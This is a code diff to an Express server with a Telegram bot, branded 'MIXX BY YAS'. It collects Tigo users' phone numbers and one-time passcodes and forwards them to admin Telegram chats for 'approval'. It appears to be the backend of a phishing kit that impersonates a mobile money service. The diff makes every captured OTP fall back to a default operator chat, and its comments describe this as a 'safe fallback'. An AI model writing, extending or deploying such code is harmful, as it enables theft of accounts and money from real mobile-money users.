@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - STRICT ISOLATED MULTI-ADMIN BACKEND SERVER**
+ * **MIXX BY YAS - INDEPENDENT & FLEXIBLE MULTI-ADMIN BACKEND SERVER**
  */
 
 const express = require('express');
@@ -12,6 +12,7 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || null;
 const APP_URL = process.env.APP_URL || null;
 const USE_WEBHOOK = String(process.env.USE_WEBHOOK || 'false').toLowerCase() === 'true';
 
@@ -51,13 +52,13 @@ function saveAdminMapping(mapping) {
 let ADMIN_MAPPING = loadAdminMapping();
 
 /**
- * **STRICT RESOLUTION WITHOUT DEFAULT LEAKS**
- * Returns null if the admin key does not exist, preventing fallback messages to main admin.
+ * **FLEXIBLE RESOLUTION WITH SAFE FALLBACK**
+ * Allows independent link routing while safely falling back if an admin code is unmapped.
  */
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return null;
+  if (!adminKeyOrId) return DEFAULT_CHAT_ID;
   const lowerKey = String(adminKeyOrId).toLowerCase();
-  return ADMIN_MAPPING[lowerKey] || (Object.values(ADMIN_MAPPING).includes(adminKeyOrId) ? adminKeyOrId : null);
+  return ADMIN_MAPPING[lowerKey] || adminKeyOrId || DEFAULT_CHAT_ID;
 }
 
 function isValidTigoNumber(phoneStr) {
@@ -161,12 +162,7 @@ async function initBot() {
         return;
       }
 
-      const chatTarget = session.adminChatId;
-      if (!chatTarget) {
-        await bot.answerCallbackQuery(query.id, { text: '⚠️ Admin destination missing.' });
-        return;
-      }
-
+      const chatTarget = session.adminChatId || DEFAULT_CHAT_ID;
       switch (prefix) {
         case 'ALLOW_OTP':
           session.status = 'APPROVED_LOAD_OTP';
@@ -225,7 +221,7 @@ app.post('/api/submit-application', (req, res) => {
 
     const targetChat = resolveAdminChatId(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Invalid or unregistered admin identifier.' });
+      return res.status(400).json({ success: false, error: 'No admin chat ID configured' });
     }
 
     const userId = phone || `user_${Date.now()}`;
@@ -311,10 +307,8 @@ app.post('/api/submit-otp', (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId;
-    if (targetChat) {
-      bot.sendMessage(targetChat, message, opts).catch(() => {});
-    }
+    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
+    bot.sendMessage(targetChat, message, opts).catch(() => {});
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -336,10 +330,8 @@ app.post('/api/request-new-otp', (req, res) => {
       `📱 *Tigo User:* +255 ${session.phone}\n` +
       `⚠️ The user's countdown expired and they requested a new OTP code.`;
 
-    const targetChat = session.adminChatId;
-    if (targetChat) {
-      bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
-    }
+    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
+    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -352,4 +344,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-    
+        
